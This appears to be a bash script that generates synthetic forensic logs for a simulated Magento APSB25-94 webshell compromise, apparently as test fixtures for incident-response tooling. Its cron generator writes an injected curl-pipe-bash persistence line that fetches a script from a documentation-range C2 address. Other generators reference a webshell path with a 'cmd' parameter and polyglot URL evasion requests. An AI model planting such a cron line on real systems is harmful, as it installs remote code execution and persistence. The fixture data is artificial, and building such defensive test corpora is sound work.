#!/usr/bin/env bash
#
# scripts/dev/synth-corpus.sh — orchestrator that emits a fleet-scale APSB25-94
# forensic bundle to exhibits/fleet-01/large-corpus/. Sources only public
# APSB25-94 advisory IOCs + RFC 5737 documentation IPs + Magento public
# docs + Apache/ModSec/cron public format specs. PolyShell operator data
# is shape-grounding only — never copied, never quoted, never parsed.
#
# Usage:
#   scripts/dev/synth-corpus.sh [--seed N] [--out DIR]
#
# Defaults:
#   --seed 42
#   --out  exhibits/fleet-01/large-corpus
#
# Output streams (target ~360k tokens / ~1.4M chars aggregate):
#   apache.access.log         ~3800 lines, ~5% attack
#   apache.error.log          ~1300 lines
#   modsec_audit.log          ~570 transactions (5130 lines)
#   fs.mtime.txt              ~2020 paths
#   cron.snapshot             ~50 user crontabs
#   proc.snapshot             ~200 procs
#   journal/auth.log          ~420 events
#   maldet.quarantine         ~500 entries
#
# Token budget rationale (4 chars/token):
#   apache.access  ~700k chars → ~175k tokens (50%)
#   modsec_audit   ~270k chars → ~67k tokens (19%)
#   apache.error   ~150k chars → ~37k tokens (11%)
#   fs.mtime.txt   ~115k chars → ~29k tokens (8%)
#   journal/auth   ~84k chars  → ~21k tokens (6%)
#   cron+proc+mal  ~40k chars  → ~10k tokens (3%)
#   total          ~1.36M chars → ~340k tokens
#
# Copyright (C) 2026 R-fx Networks <proj@rfxn.com>
# Author: Ryan MacDonald <ryan@rfxn.com>
# License: GNU GPL v2

set -euo pipefail
export LC_ALL=C

SEED=42
OUT_DIR="exhibits/fleet-01/large-corpus"
while (( $# > 0 )); do
    case "$1" in
        --seed) SEED="$2"; shift 2 ;;
        --out)  OUT_DIR="$2"; shift 2 ;;
        *) printf 'usage: %s [--seed N] [--out DIR]\n' "$0" >&2; exit 64 ;;
    esac
done
export BL_FIXTURE_SEED="$SEED"

command -v gawk >/dev/null 2>&1 || { printf 'synth-corpus: gawk required (strftime third-arg UTC; mawk lacks it)\n' >&2; exit 65; }  # 2>/dev/null: command -v exits 1 on miss; error handled explicitly via || guard

command mkdir -p "$OUT_DIR/journal"

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
[ -n "$SCRIPT_DIR" ] || { printf 'synth-corpus: cannot resolve script dir from %s\n' "$0" >&2; exit 1; }
SYNTH="$SCRIPT_DIR/synthesize-fixture-logs.sh"

# ---------------------------------------------------------------------------
# bl_synth_cron — emits 50 user crontabs to stdout; user 'magento' carries
# injected curl-pipe-bash C2 line (APSB25-94 public IOC pattern).
# Source: cron(5) POSIX spec + APSB25-94 public advisory.
# ---------------------------------------------------------------------------
bl_synth_cron() {
    command gawk -v seed="$SEED" '
    BEGIN {
        srand(seed)
        for (i = 1; i <= 50; i++) {
            user = (i == 2) ? "magento" : sprintf("user%02d", i)
            print "# User crontab: " user
            print "MAILTO=\"\""
            print "0 4 * * * /usr/local/bin/backup.sh"
            print "*/15 * * * * /usr/bin/php /var/www/cron/run.php"
            if (user == "magento") {
                # Injected C2 persistence — APSB25-94 curl-pipe-bash pattern.
                # C2 IP is 203.0.113.42 (RFC 5737 TEST-NET-3 — never routable).
                print "*/15 * * * * /usr/bin/curl -s http://203.0.113.42/c.txt|bash"
            }
            print ""
        }
    }'
}

# ---------------------------------------------------------------------------
# bl_synth_fs_mtime — emits ~2020 filesystem paths with mtimes to stdout.
# 3 attack-relevant paths cluster at 2026-03-21T23:58Z (immediately after
# the modsec POST cluster). Source: Magento media-cache path conventions
# (public Magento dev docs) + APSB25-94 advisory .cache path pattern.
# ---------------------------------------------------------------------------
bl_synth_fs_mtime() {
    command gawk -v seed="$SEED" '
    BEGIN {
        srand(seed)
        base = "/var/www/html/pub"
        exts[1] = ".jpg"; exts[2] = ".css"; exts[3] = ".js"
        nexts = 3
        for (i = 0; i < 2017; i++) {
            r = rand()
            ext = (r < 0.33) ? exts[1] : (r < 0.66) ? exts[2] : exts[3]
            # mtime: 30-day spread around base epoch
            mtime = 1773000000 + int(rand() * 2592000)
            tstr = strftime("%Y-%m-%dT%H:%M:%SZ", mtime, 1)
            printf "%s/cache/%08x%s\t%s\n", base, int(rand() * 4294967295), ext, tstr
        }
        # 3 attack-relevant paths — .cache/a.php webshell + renamed index.php + touched theme
        # Timestamps at 2026-03-21T23:58Z, matching ModSec cluster + 5min offset
        printf "%s/media/catalog/product/.cache/a.php\t2026-03-21T23:58:14Z\n", base
        printf "%s/media/catalog/product/index.php\t2026-03-21T23:58:21Z\n", base
        printf "%s/static/frontend/Magento/luma/en_US/css/styles-m.css\t2026-03-21T23:58:33Z\n", base
    }'
}

# ---------------------------------------------------------------------------
# bl_synth_proc — emits ~200 process snapshot lines to stdout.
# 0 live C2 indicators (staging artifact — webshell was staged, not active).
# Source: ps(1) output format + public Magento stack documentation.
# ---------------------------------------------------------------------------
bl_synth_proc() {
    command gawk -v seed="$SEED" '
    BEGIN {
        srand(seed)
        procs[1] = "apache2"
        procs[2] = "mysqld"
        procs[3] = "redis-server"
        procs[4] = "php-fpm"
        procs[5] = "cron"
        nprocs = 5
        for (i = 1; i <= 200; i++) {
            pid = 1000 + int(rand() * 60000)
            prc = procs[1 + int(rand() * nprocs)]
            rss = 32 + int(rand() * 512)
            printf "%d\t%s\t%dM\t-\n", pid, prc, rss
        }
    }'
}

# ---------------------------------------------------------------------------
# bl_synth_maldet — emits ~500 maldet quarantine entries to stdout.
# 10 historically relevant (legacy .cache/*.php hits); remainder are FP
# noise (JS miners, build temporaries). Source: maldet quarantine log format
# (LMD public documentation); IOC path pattern from APSB25-94 advisory.
# ---------------------------------------------------------------------------
bl_synth_maldet() {
    command gawk -v seed="$SEED" '
    BEGIN {
        srand(seed)
        for (i = 1; i <= 500; i++) {
            ts = 1740000000 + int(rand() * 60000000)
            tstr = strftime("%Y-%m-%dT%H:%M:%SZ", ts, 1)
            if (i <= 10) {
                printf "%s\tquarantined\t/var/www/html/pub/media/.cache/legacy-%d.php\tphp.cmdshell.legacy\n", tstr, i
            } else {
                printf "%s\tquarantined\t/var/www/html/cache/build-%d.tmp\tjs.miner.benign-fp\n", tstr, i
            }
        }
    }'
}

# ---------------------------------------------------------------------------
# bl_synth_apache_error — emits ~1300 Apache error log lines to stdout.
# ~10 PHP warnings reference the .cache/a.php polyglot path; the rest are
# benign PHP notices from legitimate traffic.
# Source: Apache HTTP Server error log format (Apache public docs).
# ---------------------------------------------------------------------------
bl_synth_apache_error() {
    command gawk -v seed="$SEED" '
    BEGIN {
        srand(seed)
        for (i = 0; i < 1300; i++) {
            ts = 1773000000 + i
            tstr = strftime("%a %b %d %H:%M:%S %Y", ts, 1)
            if (i % 130 == 0) {
                # Attack-adjacent PHP warning — webshell path (APSB25-94).
                # C2 client IP is RFC 5737 TEST-NET-3 (non-routable).
                printf "[%s] [error] [client 203.0.113.42] PHP Warning:  Undefined index: cmd in /var/www/html/pub/media/catalog/product/.cache/a.php on line 1\n", tstr
            } else {
                # Benign PHP notices — RFC 5737 TEST-NET-1 client IPs.
                printf "[%s] [warn] [client 192.0.2.%d] PHP Notice: Trying to access array offset on value of type bool\n", tstr, int(rand() * 200) + 1
            }
        }
    }'
}

# ---------------------------------------------------------------------------
# bl_synth_modsec_large — emits ~570 ModSec audit transactions to stdout.
# 12 admin-endpoint POST entries precede webshell drop (APSB25-94 pattern).
# Source: ModSecurity audit-log section grammar (OWASP CRS public docs).
# ---------------------------------------------------------------------------
bl_synth_modsec_large() {
    command gawk -v seed="$SEED" -v base=1774180800 -v host="magento-prod-01" '
    BEGIN {
        srand(seed + 1)
        for (i = 0; i < 570; i++) {
            ts = base + i * 27
            tstr = strftime("%Y-%m-%dT%H:%M:%SZ", ts, 1)
            txn = sprintf("txn-%06d-%04x", i, int(rand() * 65536))
            printf "--%s-A--\n", txn
            printf "[%s] [client 203.0.113.42] %s ModSecurity-Audit\n", tstr, host
            printf "--%s-B--\n", txn
            if (i >= 280 && i < 292) {
                # 12 attack-adjacent admin endpoint POSTs preceding webshell drop
                printf "POST /admin/sources/system/config/ HTTP/1.1\n"
            } else {
                printf "GET /pub/media/catalog/product/.cache/a.php/banner-%d.jpg?c=%x HTTP/1.1\n", i, int(rand() * 1048576)
            }
            printf "--%s-F--\n", txn
            printf "HTTP/1.1 200 OK Content-Length: %d\n", 256 + int(rand() * 4096)
            printf "--%s-H--\n", txn
            printf "Message: Pattern match \"\\.php/[^/]+\\.(jpg|png|gif)$\" at REQUEST_FILENAME [id \"941999\"] [msg \"APSB25-94 polyglot URL evasion\"] [severity \"CRITICAL\"] [tag \"application-multi\"]\n"
            printf "--%s-Z--\n", txn
        }
    }'
}

# ---------------------------------------------------------------------------
# bl_synth_journal_large — emits ~420 auth journal events to stdout.
# 0 direct attack indicators (web vector, not SSH).
# Source: journalctl -o json format (systemd public docs).
# ---------------------------------------------------------------------------
bl_synth_journal_large() {
    command gawk -v seed="$SEED" -v base=1774180800 -v host="magento-prod-01" '
    BEGIN {
        srand(seed + 2)
        msgs[0] = "sshd[%d]: Accepted publickey for deploy from 192.0.2.10 port %d ssh2"
        msgs[1] = "sshd[%d]: session opened for user deploy by (uid=0)"
        msgs[2] = "sshd[%d]: Disconnected from 192.0.2.10 port %d"
        msgs[3] = "sudo: deploy : TTY=pts/0 ; PWD=/var/www ; USER=root ; COMMAND=/usr/bin/systemctl restart apache2"
        msgs[4] = "sshd[%d]: Connection closed by 192.0.2.11 port %d [preauth]"
        n = 5
        for (i = 0; i < 420; i++) {
            ts = base + i * 3
            rt = ts * 1000000
            mi = i % n
            pid = 2000 + int(rand() * 8000)
            port = 30000 + int(rand() * 30000)
            if (mi == 3) {
                m = msgs[mi]
            } else {
                m = sprintf(msgs[mi], pid, port)
            }
            printf "{\"__REALTIME_TIMESTAMP\":\"%d\",\"_HOSTNAME\":\"%s\",\"_SYSTEMD_UNIT\":\"sshd.service\",\"PRIORITY\":\"6\",\"MESSAGE\":\"%s\"}\n", rt, host, m
        }
    }'
}

# ---------------------------------------------------------------------------
# Dispatch — run all stages in order
# ---------------------------------------------------------------------------

# Stage 1: apache.access.log — 3800 lines (5% attacker traffic, APSB25-94 pattern)
# Passing positional args: host, access-log, modsec-log (empty), journal (empty), lines
"$SYNTH" "magento-prod-01" \
    "$OUT_DIR/apache.access.log" \
    "" \
    "" \
    3800

# Stage 2: modsec_audit.log — 570 transactions (5130 lines)
bl_synth_modsec_large > "$OUT_DIR/modsec_audit.log"

# Stage 3: journal/auth.log — 420 events
bl_synth_journal_large > "$OUT_DIR/journal/auth.log"

# Stage 4: cron.snapshot — 50 user crontabs
bl_synth_cron > "$OUT_DIR/cron.snapshot"

# Stage 5: fs.mtime.txt — 2017 benign paths + 3 attack-relevant
bl_synth_fs_mtime > "$OUT_DIR/fs.mtime.txt"

# Stage 6: proc.snapshot — 200 procs
bl_synth_proc > "$OUT_DIR/proc.snapshot"

# Stage 7: maldet.quarantine — 500 historical entries
bl_synth_maldet > "$OUT_DIR/maldet.quarantine"

# Stage 8: apache.error.log — 1300 lines
bl_synth_apache_error > "$OUT_DIR/apache.error.log"

printf 'synth-corpus: emitted to %s (seed=%s)\n' "$OUT_DIR" "$SEED"
